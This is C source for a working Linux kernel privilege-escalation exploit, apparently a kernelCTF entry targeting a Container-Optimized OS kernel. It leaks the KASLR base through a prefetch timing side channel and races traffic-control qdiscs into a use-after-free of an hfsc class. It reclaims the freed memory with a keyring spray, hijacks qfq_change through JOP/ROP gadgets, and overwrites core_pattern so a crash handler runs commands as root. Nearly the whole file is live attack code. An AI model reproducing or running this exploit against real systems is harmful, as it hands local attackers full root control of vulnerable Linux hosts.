#define _GNU_SOURCE
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/net_tstamp.h>
#include <linux/socket.h>
#include <linux/udp.h>
#include <arpa/inet.h>
#include <linux/keyctl.h>
#include <sched.h>
#include <err.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <stddef.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/xattr.h>
#include <netinet/ip.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/syscall.h>
#include <net/if.h>
#include <pthread.h>
#include <libmnl/libmnl.h>
#include <sys/auxv.h>
#include <sys/sendfile.h>
#include <libnftnl/table.h>
#include <libnftnl/flowtable.h>
#include <libnftnl/chain.h>
#include <libnftnl/rule.h>
#include <libnftnl/expr.h>
#include <libnftnl/object.h>
#include <linux/if_packet.h>
#include <net/ethernet.h> /* the L2 protocols */
#include <sys/socket.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/if_link.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <sys/resource.h>
#include <linux/if.h>
#include <linux/keyctl.h>
#include <byteswap.h>
#include <linux/netfilter/ipset/ip_set.h>
#include <linux/netfilter/ipset/ip_set_bitmap.h>
#include <err.h>
#include <linux/if_ether.h>
#include <linux/tc_act/tc_gact.h>
#include <linux/pkt_cls.h>
#include <limits.h>
#include <errno.h>
#include <linux/prctl.h>
#include <sys/prctl.h>

uint64_t g_kernel_base = 0xffffffff81000000;
// define for kernelctf server, undefine for GH actions repro
// #define KASLR_INTEL

// cos-109-17800.519.1
// p &qfq_qdisc_ops.change
#define QFQ_CHANGE (0xffffffff83d8bb38 - 0xffffffff81000000 + g_kernel_base)
// 0xffffffff81c6436c: push rsi; jmp qword ptr [rsi-0x70];
#define JOP_GADGET (0xffffffff81c6436c - 0xffffffff81000000 + g_kernel_base)
// 0xffffffff8113f5de: pop rsp; pop r15; ret;
#define ROP_GADGET (0xffffffff8113f5de - 0xffffffff81000000 + g_kernel_base)
#define POP_RDI (0xffffffff813fee21 - 0xffffffff81000000 + g_kernel_base)
#define POP_RSI (0xffffffff8144312e - 0xffffffff81000000 + g_kernel_base)
#define POP_RDX (0xffffffff815c2172 - 0xffffffff81000000 + g_kernel_base)
// _copy_from_user
#define COPY_FROM_USER (0xffffffff818dd650 - 0xffffffff81000000 + g_kernel_base)
#define MSLEEP (0xffffffff812415c0 - 0xffffffff81000000 + g_kernel_base)
#define CORE_PATTERN (0xffffffff83bbb2c0 - 0xffffffff81000000 + g_kernel_base)

/* common utils */
void fatal(const char *msg)
{
    printf("[Fatal!] ");
    puts(msg);
    fflush(stdout);
    fflush(stderr);
    exit(EXIT_FAILURE);
}

#define SYSOK(x) ({                     \
    typeof(x) __res = (x);              \
    if (__res != (typeof(x))0)          \
        err(1, "[fail] SYSOK(" #x ")"); \
    __res;                              \
})

void set_cpu(int c)
{
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(c, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);
}

void mypause()
{
    printf("[~] pausing... (press enter to continue)\n");
    char scratch[11];
    read(0, scratch, 10); // wait for input
}
/* common utils end */

/*KASLR leak*/
#define MIN_STEXT 0xffffffff81000000
#define MAX_STEXT 0xffffffffbb000000
#define BASE_INC 0x1000000
#define SYS_GETUID 0x1a7440

inline __attribute__((always_inline)) size_t rdtsc_begin()
{
    size_t a, d;
    asm volatile(
        "mfence\n\t"
        "RDTSCP\n\t"
        "mov %%rdx, %0\n\t"
        "mov %%rax, %1\n\t"
        "xor %%rax, %%rax\n\t"
        "mfence\n\t"
        : "=r"(d), "=r"(a)
        :
        : "%rax", "%rbx", "%rcx", "%rdx");
    a = (d << 32) | a;
    return a;
}

inline __attribute__((always_inline)) size_t rdtsc_end()
{
    size_t a, d;
    asm volatile(
        "xor %%rax, %%rax\n\t"
        "mfence\n\t"
        "RDTSCP\n\t"
        "mov %%rdx, %0\n\t"
        "mov %%rax, %1\n\t"
        "mfence\n\t"
        : "=r"(d), "=r"(a)
        :
        : "%rax", "%rbx", "%rcx", "%rdx");
    a = (d << 32) | a;
    return a;
}

void prefetch(void *p)
{
    asm volatile("prefetchnta (%0)" : : "r"(p));
    asm volatile("prefetcht2 (%0)" : : "r"(p));
}

size_t onlyreload(void *addr)
{
    size_t time = rdtsc_begin();
    prefetch(addr);
    size_t delta = rdtsc_end() - time;
    return delta;
}

size_t kaslr_leak()
{
    size_t base = -1;
#ifdef KASLR_INTEL
    const int tries1 = 1000, tries2 = 1000;

    while (base == ~0ULL)
    {
        size_t time;
        size_t min = -1;

        size_t addr = 0xffffffff80000000;
        for (int i = 0; i < tries1; i++)
        {
            time = onlyreload((void *)addr);
            min = min < time ? min : time;
        }

        for (int i = 0; i < tries2; i++)
        {
            for (addr = MIN_STEXT; addr <= MAX_STEXT; addr += BASE_INC)
            {
                time = onlyreload((void *)(addr + SYS_GETUID));
                if (time < min && addr < base)
                {
                    base = addr;
                }
            }
        }
    }
#else
#define START (0xffffffff81000000ull)
#define END (0xffffffffc0000000ull)
#define STEP 0x0000000000200000ull
#define NUM_TRIALS 7
// largest contiguous mapped area at the beginning of _stext
#define WINDOW_SIZE 11

    while (1)
    {
        uint64_t bases[NUM_TRIALS] = {0};

        for (size_t vote = 0; vote < NUM_TRIALS; vote++)
        {
#define TIMES_LEN ((END - START) / STEP)
            size_t times[TIMES_LEN] = {};
            uint64_t addrs[TIMES_LEN];

            for (size_t ti = 0; ti < TIMES_LEN; ti++)
            {
                times[ti] = ~0;
                addrs[ti] = START + STEP * (uint64_t)ti;
            }

            for (size_t i = 0; i < 16; i++)
            {
                for (size_t ti = 0; ti < TIMES_LEN; ti++)
                {
                    uint64_t addr = addrs[ti];
                    size_t t = onlyreload((void *)addr);
                    if (t < times[ti])
                    {
                        times[ti] = t;
                    }
                }
            }

            uint64_t max = 0;
            int max_i = 0;
            for (size_t ti = 0; ti < TIMES_LEN - WINDOW_SIZE; ti++)
            {
                uint64_t sum = 0;
                for (size_t i = 0; i < WINDOW_SIZE; i++)
                {
                    sum += times[ti + i];
                }
                if (sum > max)
                {
                    max = sum;
                    max_i = ti;
                }
            }

            bases[vote] = addrs[max_i];
        }

        size_t c = 0;
        for (size_t i = 0; i < NUM_TRIALS; i++)
        {
            if (c == 0)
            {
                base = bases[i];
            }
            else if (base == bases[i])
            {
                c++;
            }
            else
            {
                c--;
            }
        }

        c = 0;
        for (size_t i = 0; i < NUM_TRIALS; i++)
        {
            if (base == bases[i])
            {
                c++;
            }
        }
        if (c > NUM_TRIALS / 2)
        {
            break;
        }

        printf("majority vote failed:\n");
        printf("base = %zx with %zu votes\n", base, c);
    }
#endif
    return base;
}
/*KASLR leak end*/

// Unshare stuff
// Write to a file so we can set our user ids
int write_mapping(const char *path, const char *content)
{
    int fd = open(path, O_WRONLY);
    if (fd == -1)
    {
        printf("Failed to open %s: %s\n", path, strerror(errno));
        return -1;
    }

    if (write(fd, content, strlen(content)) != (ssize_t)strlen(content))
    {
        printf("Failed to write to %s: %s\n", path, strerror(errno));
        close(fd);
        return -1;
    }
    close(fd);
    return 0;
}

void setup_userns(void)
{
    // Unshare into new user namespace
    if (unshare(CLONE_NEWUSER | CLONE_NEWNET | CLONE_NEWNS) == -1)
    {
        printf("unshare failed: %s\n", strerror(errno));
        exit(-1);
    }

    // First disable setgroups
    if (write_mapping("/proc/self/setgroups", "deny") == -1)
    {
        printf("Failed to disable setgroups\n");
        exit(-1);
    }

    // Then map our UID and GID
    if (write_mapping("/proc/self/uid_map", "0 1000 1") == -1 ||
        write_mapping("/proc/self/gid_map", "0 1000 1") == -1)
    {
        printf("Failed to write ID mappings\n");
        exit(-1);
    }
}

/*netlink utils*/
struct netlink_send_cb_struct
{
    void (*cb)(char *, size_t, void *);
    void *cb_out;
};

int __netlink_send(int fd, const void *nlh, size_t size, char *nlbuf, size_t nlbuf_sz, int has_done_msg, struct netlink_send_cb_struct *cb_info)
{
    char nlbuf_cb_scratch[1024];
    struct iovec iov = {
        .iov_base = (void *)nlh,
        .iov_len = size,
    };
    struct msghdr msg = {
        .msg_name = NULL,
        .msg_namelen = 0,
        .msg_iov = &iov,
        .msg_iovlen = 1,
        .msg_control = NULL,
        .msg_controllen = 0,
        .msg_flags = 0,
    };

    if (sendmsg(fd, &msg, 0) < 0)
    {
        perror("sendmsg()");
        return -1;
    }
    ssize_t ret = recvfrom(fd, nlbuf, nlbuf_sz, 0, NULL, NULL);
    if (ret == -1)
    {
        perror("recvfrom()");
        return -1;
    }

    if (has_done_msg)
    {
        ssize_t ret2 = recvfrom(fd, &nlbuf_cb_scratch, sizeof(nlbuf_cb_scratch), 0, NULL, NULL); // done msg  TODO: not all requests have this...
        if (ret2 == -1)
        {
            perror("recvfrom()");
            return -1;
        }
    }

    struct nlmsghdr *response_nlh = (struct nlmsghdr *)nlbuf;
    {
        struct nlmsgerr *err = (struct nlmsgerr *)NLMSG_DATA(response_nlh);
        if (err->error)
        {
            fprintf(stderr, "Netlink Result: %s\n", strerror(-err->error));
            return -err->error;
        }
    }

    if (cb_info)
        cb_info->cb(nlbuf, ret, cb_info->cb_out);
    return 0;
}

int netlink_send(int fd, const struct nlmsghdr *nlh)
{
    char nlbuf[4096] = {0}; // Buffer to store the response
    return __netlink_send(fd, nlh, nlh->nlmsg_len, nlbuf, sizeof(nlbuf), 0, NULL);
}

int netlink_open(int proto)
{
    struct sockaddr_nl addr = {0};
    addr.nl_family = AF_NETLINK;

    int s = socket(AF_NETLINK, SOCK_RAW, proto);
    if (s < 0)
    {
        perror("socket()");
        return s;
    }
    if (bind(s, (struct sockaddr *)&addr, sizeof(addr)) == -1)
    {
        perror("bind()");
        return -1;
    }

    return s;
}
/*netlink utils end*/

/*set interface up*/
int set_interface_flags(int sock, const char *ifname, int flags, int change)
{
    struct
    {
        struct nlmsghdr nlh;
        struct ifinfomsg ifm;
        char buf[64];
    } req;

    // Prepare the netlink request
    memset(&req, 0, sizeof(req));

    // Setup the netlink header
    req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg));
    req.nlh.nlmsg_type = RTM_SETLINK;
    req.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    req.nlh.nlmsg_seq = 1;

    // Setup the interface info message
    req.ifm.ifi_family = AF_UNSPEC;
    req.ifm.ifi_index = if_nametoindex(ifname);
    if (req.ifm.ifi_index == 0)
    {
        perror("if_nametoindex");
        close(sock);
        return -1;
    }

    // Set the interface flags
    req.ifm.ifi_change = change;
    req.ifm.ifi_flags = flags;

    // Send the netlink message
    struct sockaddr_nl nladdr = {0};
    struct iovec iov;
    struct msghdr msg = {0};
    nladdr.nl_family = AF_NETLINK;
    iov.iov_base = &req.nlh;
    iov.iov_len = req.nlh.nlmsg_len;
    msg.msg_name = &nladdr;
    msg.msg_namelen = sizeof(nladdr);
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    if (sendmsg(sock, &msg, 0) < 0)
    {
        perror("send_netlink_message");
        close(sock);
        return -1;
    }

    // Read the ACK response
    char buf[4096];
    int len;
    struct nlmsghdr *resp_nlh;

    len = recv(sock, buf, sizeof(buf), 0);
    if (len < 0)
    {
        perror("recv");
        close(sock);
        return -1;
    }

    resp_nlh = (struct nlmsghdr *)buf;
    if (resp_nlh->nlmsg_type == NLMSG_ERROR)
    {
        struct nlmsgerr *err = NLMSG_DATA(resp_nlh);
        if (err->error != 0)
        {
            fprintf(stderr, "Netlink error: %s\n", strerror(-err->error));
            close(sock);
            return -1;
        }
    }
    return 0;
}

// Function to bring an interface up
int set_interface_up(int fd, const char *ifname)
{
    return set_interface_flags(fd, ifname, IFF_UP, IFF_UP);
}
/*set interface up end*/

/*requests*/
int _send_req(int priority, int no_block)
{
    int sock;
    struct sockaddr_in server;

    // Create UDP socket
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0)
    {
        perror("Failed to create socket");
        return 1;
    }

    if (setsockopt(sock, SOL_SOCKET, SO_PRIORITY, &priority, sizeof(priority)) < 0)
    {
        perror("Failed to set socket priority");
        close(sock);
        return 1;
    }

    if (!no_block)
    {
        // Set socket to non-blocking mode
        int flags = fcntl(sock, F_GETFL, 0);
        if (flags < 0)
        {
            perror("Failed to get socket flags");
            close(sock);
            return 1;
        }
        if (fcntl(sock, F_SETFL, flags | O_NONBLOCK) < 0)
        {
            perror("Failed to set socket to non-blocking");
            close(sock);
            return 1;
        }
    }

    // Configure server address
    memset(&server, 0, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_port = htons(8888);
    if (inet_pton(AF_INET, "127.0.0.1", &server.sin_addr) <= 0)
    {
        perror("Invalid address");
        close(sock);
        return 1;
    }

    // Send empty datagram
    if (sendto(sock, "", 0, 0, (struct sockaddr *)&server, sizeof(server)) < 0)
    {
        perror("Failed to send");
        close(sock);
        return 1;
    }

    close(sock);
    return 0;
}

int send_req(int priority)
{
    return _send_req(priority, 0);
}

int send_req_noblock(int priority)
{
    return _send_req(priority, 1);
}
/*requests end*/

/*util functions for tc*/
int get_qdisc_handle(__u32 *h, const char *str)
{
    *h = 0;
    __u32 maj;
    char *p;

    maj = TC_H_UNSPEC;
    if (strcmp(str, "none") == 0)
        goto ok;
    maj = strtoul(str, &p, 16);
    if (p == str || maj >= (1 << 16))
        return -1;
    maj <<= 16;
    if (*p != ':' && *p != 0)
        return -1;
ok:
    *h = maj;
    return 0;
}

int get_tc_classid(__u32 *h, const char *str)
{
    __u32 maj, min;
    char *p;

    maj = TC_H_ROOT;
    if (strcmp(str, "root") == 0)
        goto ok;
    maj = TC_H_UNSPEC;
    if (strcmp(str, "none") == 0)
        goto ok;
    maj = strtoul(str, &p, 16);
    if (p == str)
    {
        maj = 0;
        if (*p != ':')
            return -1;
    }
    if (*p == ':')
    {
        if (maj >= (1 << 16))
            return -1;
        maj <<= 16;
        str = p + 1;
        min = strtoul(str, &p, 16);
        if (*p != 0)
            return -1;
        if (min >= (1 << 16))
            return -1;
        maj |= min;
    }
    else if (*p != 0)
        return -1;

ok:
    *h = maj;
    return 0;
}

static __u32 get_id(const char *s_class)
{
    if (s_class[strlen(s_class) - 1] == '0')
    {
        // eg 2.0
        __u32 result;
        SYSOK(get_qdisc_handle(&result, s_class));
        return result;
    }
    else
    {
        // eg 2.1
        __u32 result;
        SYSOK(get_tc_classid(&result, s_class));
        return result;
    }
}
/*util functions for tc end*/

/*keyring section*/
#define KEY_DESC_SIZE (0x200 - 0x18 + 1)
char key_desc[KEY_DESC_SIZE];

typedef int32_t key_serial_t;

static inline key_serial_t add_key(const char *type, const char *description, const void *payload, size_t plen, key_serial_t ringid)
{
    return syscall(__NR_add_key, type, description, payload, plen, ringid);
}

key_serial_t *spray_keyring(uint32_t start, uint32_t spray_size)
{
    key_serial_t *id_buffer = calloc(spray_size, sizeof(key_serial_t));

    if (id_buffer == NULL)
        fatal("calloc");

    for (uint32_t i = start; i < start + spray_size; i++)
    {
        key_desc[0] = '\x01' + i;
        id_buffer[i] = add_key("user", key_desc, key_desc, sizeof(key_desc), KEY_SPEC_PROCESS_KEYRING);
    }

    return id_buffer;
}
/*keyring section end*/

#include "qdisc.h"
#include "tc_filters.h"

/*exp code start*/
// standard service curve for hfsc
struct tc_service_curve fsc = {
    .d = 1,
    .m1 = UINT_MAX,
    .m2 = UINT_MAX};

void setup_spam_tree(int fd, unsigned int spam_parent_handle)
{
    // spam: this stage increases the delay after prio_tune unlock & resetting sfq
    SYSOK(create_qdisc_hfsc_defaultclass(fd, get_id("2:0"), spam_parent_handle, 1));
    SYSOK(create_class_hfsc(fd, get_id("2:1"), get_id("2:0"), NULL, &fsc, NULL));
    SYSOK(create_class_hfsc(fd, get_id("2:2"), get_id("2:0"), NULL, &fsc, NULL));

    SYSOK(create_qdisc_sfq_spam(fd, get_id("4:0"), get_id("2:1")));
    SYSOK(create_qdisc_plug1024(fd, get_id("5:0"), get_id("2:2")));
    SYSOK(create_filter(fd, get_u32_handle("800::800"), get_id("1:0"), get_id("1:3"))); // direct packets hitting prio into this qdisc
    SYSOK(send_req(get_id("2:2")));

    for (int j = 0; j < 1; j++) // can be tweaked to increase the delay
    {
        for (int i = 0; i < 0x10000 - 127 - 1; i++)
        {
            // we can send non-blocking requests here because we don't need an exact number.
            // anyway, by the time we finish setup, most packets have gone through.
            SYSOK(send_req_noblock(0x40000 + i));
        }
    }

    SYSOK(delete_filter(fd, get_u32_handle("800::800"), get_id("1:0")));
}

int setup_race(int fd, unsigned int prio_parent_handle)
{
    SYSOK(create_qdisc_prio(fd, get_id("1:0"), prio_parent_handle, 4));

    setup_spam_tree(fd, get_id("1:3"));

    // continue setting up the rest of the tree
    SYSOK(create_qdisc_hfsc_defaultclass(fd, get_id("3:0"), get_id("1:4"), 1));
    SYSOK(create_class_hfsc(fd, get_id("3:1"), get_id("3:0"), NULL, &fsc, NULL));
    SYSOK(create_class_hfsc(fd, get_id("3:2"), get_id("3:0"), NULL, &fsc, NULL));
    SYSOK(create_qdisc_plug1024(fd, get_id("6:0"), get_id("3:2")));

    SYSOK(create_filter(fd, get_u32_handle("800::800"), get_id("1:0"), get_id("1:4"))); // filter packets into the hfsc qdisc containing sfq
    SYSOK(send_req(get_id("3:2")));                                                     // enters plug

    if (fork() == 0)
    {
        set_cpu(1);
        // register timer on other cpu
        // This sfq qdisc will have 2 flows, 2 slots.
        SYSOK(create_qdisc_sfq(fd, get_id("7:0"), get_id("3:1"), INT_MAX)); // negative delay
        SYSOK(send_req(get_id("7:1")));                                     // go into sfq slot
        // now, basically nothing will run on CPU 1 because the timer always runs. until the timer is disabled when the qdisc is deleted.
        exit(0);
    }

    // wait for packet to be enqueued
    while (1)
    {
        usleep(1000 * 10);
        struct qdisc_stats stats;
        if (dump_qdisc_v2(fd, get_id("7:0"), &stats) == 0 && stats.qlen == 1)
            break;
    }

    return 0;
}

int do_race(int fd, unsigned int prio_parent_handle)
{
    int exp_success = 0;
    puts("[~] starting race!");

    // race: we send packets to saturate sfq and begin prio tune before the next timer cycle
    SYSOK(send_req_noblock(get_id("7:2"))); // we make the first 2 requests non-blocking so that we can send all 3 requests ASAP
    SYSOK(send_req_noblock(get_id("7:2")));
    SYSOK(send_req(get_id("7:2"))); // waiting for the 3rd packet is good enough for all 3 packets to be received (most of the time)

    // one possible failure point is for the timer to hit while sfq_dequeue is running
    // this crashes the system, so we want to avoid this
    // to that end, we:
    // 1. increase the delay window (spam above)
    // 2. only send a total of 3 packets to prevent a double dequeue (which would increase the chances of hitting the failure point)

    /* notes about sfq rehashing ==========================
    creating sfq gives 2 flows and 2 slots for a limit of 4. rehashing almost certainly drops a packet when there are 4 packets. when there are only 3, it drops a packet ~1/8 times.
    because the timer runs so rapidly, it usually drops the 4th packet before prio_tune is triggered. then, it is a matter of lucking out and dropping the 3rd packet while prio_tune is running.
    increasing the time taken to destroy the other band (spam) increases the odds here, but it is far from 100%. so we retry until we succeed.
    */

    // prune (prio_tune)
    SYSOK(create_qdisc_prio(fd, get_id("1:0"), prio_parent_handle, 2));

    // ATP, the parent prio has qlen = -1

    // check success
    struct qdisc_stats stats;
    SYSOK(dump_qdisc_v2(fd, get_id("1:0"), &stats));
    if (stats.qlen == ~0U) // underflow
    {
        puts("[+] race success!");
        exp_success = 1;
    }
    else
    {
        printf("[-] race fail (backlog %ub, qlen %up)\n", stats.backlog, stats.qlen);
    }

    return exp_success;
}

void reset_race(int fd, unsigned int prio_parent_handle)
{
    SYSOK(delete_filter(fd, get_u32_handle("800::800"), get_id("1:0")));
    SYSOK(delete_qdisc(fd, get_id("1:0"), prio_parent_handle, "prio"));
}

void underflow_prio_qlen(const int fd, unsigned int prio_parent)
{
    for (int i = 0;; i++)
    {
        printf("[~] Attempt %d\n", i);
        setup_race(fd, prio_parent);
        int success = do_race(fd, prio_parent);
        if (success)
        {
            printf("[+] SUCCESS on Attempt %d\n", i);
            break;
        }
        // reset
        reset_race(fd, prio_parent);
    }
}

void setup_main_tree(int fd)
{
    SYSOK(create_qdisc_hfsc_defaultclass(fd, get_id("99:0"), TC_H_ROOT, 1));
    struct tc_service_curve fsc = {
        .d = 1,
        .m1 = UINT_MAX,
        .m2 = UINT_MAX};
    SYSOK(create_class_hfsc(fd, get_id("99:1"), get_id("99:0"), NULL, &fsc, NULL));
    SYSOK(create_class_hfsc(fd, get_id("99:2"), get_id("99:0"), NULL, &fsc, NULL)); // for triggering dequeue later

    SYSOK(create_qdisc_hfsc_defaultclass(fd, get_id("100:0"), get_id("99:1"), 1));
    SYSOK(create_class_hfsc(fd, get_id("100:1"), get_id("100:0"), NULL, &fsc, NULL));
    SYSOK(create_class_hfsc(fd, get_id("100:3"), get_id("100:0"), NULL, &fsc, NULL));

    SYSOK(create_qdisc_plug1024(fd, get_id("102:0"), get_id("100:3")));
    const int stored_packets = 2;
    for (int i = 0; i < stored_packets; i++)
    {                                     // note: minimizing the number of packets here makes the race succeed better
        SYSOK(send_req(get_id("100:3"))); // plug
    }
}

void setup_uaf(int fd)
{
    setup_main_tree(fd);
    unsigned int prio_parent = get_id("100:1");
    underflow_prio_qlen(fd, prio_parent);

    // At this point, prio has qlen = -1, plug has qlen = stored_packets, parent drr has qlen = (stored_packets-1) (due to double remove)
    // trigger drop (stored_packets) (qdisc_tree_reduce_backlog)
    SYSOK(delete_qdisc(fd, get_id("102:0"), get_id("100:3"), "plug"));

    // At this point, we have hfsc (-1) -> hfsc (-1) -> prio (-1)
    // so, we add a plug to prio and enqueue 1 packet
    SYSOK(create_qdisc_plug1024(fd, get_id("105:0"), get_id("1:1")));
    SYSOK(send_req(get_id("1:1")));

    puts("[~] deleting class ...");
    SYSOK(delete_class(fd, get_id("99:1"), get_id("99:0"), "hfsc")); // free
}

void trigger_uaf()
{
    SYSOK(send_req(get_id("99:2"))); // trigger hfsc_dequeue to hit UAF class
}

const char desired_core_pattern[] = "|/proc/%P/fd/666 %P";
int check_core()
{
    // Check if /proc/sys/kernel/core_pattern has been overwritten
    char buf[0x100] = {0};
    int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
    read(core, buf, sizeof(buf));
    close(core);
    return strncmp(buf, desired_core_pattern, strlen(desired_core_pattern)) == 0;
}

void crash()
{
    int memfd = memfd_create("", 0);
    sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff);
    dup2(memfd, 666);
    close(memfd);

    while (check_core() == 0)
        usleep(100); // 0.1ms

    *(size_t *)0 = 0;
}

int new_qfq_qdisc(int sock_fd, __u32 my_handle, __u32 parent_handle, size_t buf1_len, const char *buf1, size_t buf2_len, const char *buf2)
{
    char buf[0x1000] = {0};
    struct nlmsghdr *nlh = mnl_nlmsg_put_header(buf);

    nlh->nlmsg_type = RTM_NEWQDISC;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE;

    struct tcmsg *tcm = mnl_nlmsg_put_extra_header(nlh, sizeof(struct tcmsg));
    tcm->tcm_family = AF_UNSPEC;
    unsigned int ifindex = if_nametoindex(PWN_TC_QDISC_INTERFACE);
    if (ifindex == 0)
        fatal("ifindex");
    tcm->tcm_ifindex = ifindex;
    tcm->tcm_handle = my_handle;
    tcm->tcm_parent = parent_handle;

    mnl_attr_put_strz(nlh, TCA_KIND, "qfq");
    mnl_attr_put(nlh, TCA_OPTIONS, buf1_len, buf1);
    mnl_attr_put(nlh, TCA_OPTIONS, buf2_len, buf2);

    return netlink_send(sock_fd, nlh);
}

/* hfsc_class offsets (obtained from pahole) */
// COS 109 version
#define KEY_DESC_HEADER_SIZE 0x18
#define LEVEL_OFFSET 100
#define CL_PARENT_OFFSET 112
#define VT_NODE_OFFSET 192
#define CF_NODE_OFFSET 224
#define CL_VT_OFFSET 280
#define CL_CVTMIN_OFFSET 312
#define CL_E_OFFSET 272

int prep_key_desc(size_t target, size_t write_val)
{
    /* Place fake hfsc_class in keydesc */
    memset(key_desc, 0, sizeof(key_desc));

    /* hfsc_class.level = 1 (must be non-zero) */
    key_desc[LEVEL_OFFSET - KEY_DESC_HEADER_SIZE] = 1;
    /* hfsc_class.vt_node = 1 (must be odd) */
    key_desc[VT_NODE_OFFSET - KEY_DESC_HEADER_SIZE] = 1;
    /* hfsc_class.cf_node = 1 (must be odd) */
    key_desc[CF_NODE_OFFSET - KEY_DESC_HEADER_SIZE] = 1;

    /* hfsc_class.cl_e > cur_time (fail eltree_get_mindl)*/
    *(size_t *)&key_desc[CL_E_OFFSET - KEY_DESC_HEADER_SIZE] = 0xffffffffffffffff;

    /* hfsc_class.parent = &qfq_change_qdisc (write target)*/
    *(size_t *)&key_desc[CL_PARENT_OFFSET - KEY_DESC_HEADER_SIZE] = target - CL_CVTMIN_OFFSET;
    /* hfsc_class.cl_vt = jop_gadget (write value) */
    *(size_t *)&key_desc[CL_VT_OFFSET - KEY_DESC_HEADER_SIZE] = write_val;

    return 0;
}

void core_pattern_handler(char **argv)
{
    int pid = strtoull(argv[1], 0, 10);
    int pfd = syscall(SYS_pidfd_open, pid, 0);
    int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
    int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
    int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
    dup2(stdinfd, 0);
    dup2(stdoutfd, 1);
    dup2(stderrfd, 2);
    /* Get flag and poweroff immediately to boost next round try in PR verification workflow */
    system("cat /flag;sleep 1;echo o>/proc/sysrq-trigger");
    exit(0);
}

void prep_rop(char *payload1, char *payload2)
{
    *(size_t *)&payload1[0x10] = ROP_GADGET;
    size_t *rop = (size_t *)&payload2[4];
    size_t x = 0;
    rop[x++] = POP_RDI;
    rop[x++] = CORE_PATTERN;
    rop[x++] = POP_RSI;
    rop[x++] = (size_t)&desired_core_pattern;
    rop[x++] = POP_RDX;
    rop[x++] = sizeof(desired_core_pattern);
    rop[x++] = COPY_FROM_USER;
    // msleep(0x10000);
    rop[x++] = POP_RDI;
    rop[x++] = 0x10000;
    rop[x++] = MSLEEP;
}

void trigger_qfq_change(const int netlink_fd, const char *payload1, size_t payload1_sz, const char *payload2, size_t payload2_sz)
{
    puts("[~] triggering qdisc change now");
    struct tc_service_curve rsc = {
        .d = 1,
        .m1 = UINT_MAX,
        .m2 = UINT_MAX};
    // create class to attach qdisc to
    SYSOK(create_class_hfsc(netlink_fd, get_id("99:6"), get_id("99:0"), &rsc, &rsc, NULL));
    // create qdisc
    SYSOK(new_qfq_qdisc(netlink_fd, get_id("97:0"), get_id("99:6"), payload1_sz, payload1, payload2_sz, payload2));
    // trigger change
    // before rsi is param1 contiguous, rsi = 4 hdr bytes + buf2
    SYSOK(new_qfq_qdisc(netlink_fd, get_id("97:0"), get_id("99:6"), payload1_sz, payload1, payload2_sz, payload2));
}

int main(int argc, char **argv)
{
    setvbuf(stdout, 0, 2, 0);
    if (argc > 1)
    {
        core_pattern_handler(argv);
    }

    g_kernel_base = kaslr_leak();
    printf("[>] Kernel base address: 0x%lx\n", g_kernel_base);

    if (geteuid() != 0)
        setup_userns();

    set_cpu(0); // main exploit thread runs on CPU 0. others will run on CPU 1.

    const int netlink_fd = netlink_open(NETLINK_ROUTE);
    if (netlink_fd < 0)
    {
        fprintf(stderr, "Failed to open Netlink socket\n");
        return EXIT_FAILURE;
    }

    SYSOK(set_interface_up(netlink_fd, "lo"));

    // used when spraying later
    prep_key_desc(QFQ_CHANGE, JOP_GADGET);

    puts("[+] prepping UAF");
    // get UAF hfsc_class
    setup_uaf(netlink_fd);

    puts("[+] spraying slab to reclaim with key_desc");
    spray_keyring(0, 30); // if more, we fail with 'Disk quota exceeded'

    puts("[+] sending request, will trigger hfsc dequeue");
    trigger_uaf();
    // At this point, we have overwritten qfq_change

    puts("[~] forking process for core_pattern exp later");
    if (fork() == 0) // this process is used to trigger core_pattern exploit
    {
        set_cpu(1);
        crash();
    }

    char payload1[0x80] = {0};
    char payload2[0x80] = {0};
    prep_rop(payload1, payload2);

    trigger_qfq_change(netlink_fd, payload1, sizeof(payload1), payload2, sizeof(payload2));
    return 0;
}